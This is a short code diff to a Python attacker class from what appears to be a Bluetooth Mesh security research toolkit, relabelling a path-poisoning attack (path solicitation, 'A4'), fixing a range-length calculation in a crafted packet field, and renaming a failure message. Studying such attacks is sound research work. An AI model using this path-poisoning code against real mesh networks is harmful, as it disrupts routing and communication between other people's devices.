@@ -1,5 +1,5 @@
 """
-Attacker object for the Bluetooth Mesh path poisoning via bidirectional paths (A3)
+Attacker object for the Bluetooth Mesh path poisoning via path solicitation (A4)
 """
 
 import logging
@@ -190,7 +190,7 @@ class PathPoisonSolicitationAttacker(Attacker):
                     ),
                     dependent_target_unicast_addr_range=UnicastAddr(
                         length_present=1,
-                        range_length=(0x7FFF - pkt.destination + 0xFF + 0xFF) % 0xFF,
+                        range_length=(0x7FFF - pkt.destination + 0xFF + 0xFF) & 0xFF,
                         range_start=pkt.destination + 0xFF,
                     ),
                 )
@@ -227,7 +227,7 @@ class PathPoisonSolicitationAttacker(Attacker):
             self._show_dict_result()
         else:
             print(
-                "PathPoisonBidir attack did not run once or failed. Messages might have not been received or no victims have trigger addreses that they have a path to."
+                "PathPoisonSolicitation attack did not run once or failed. Messages might have not been received or no victims have trigger addreses that they have a path to."
             )
 
     def _show_dict_result(self):
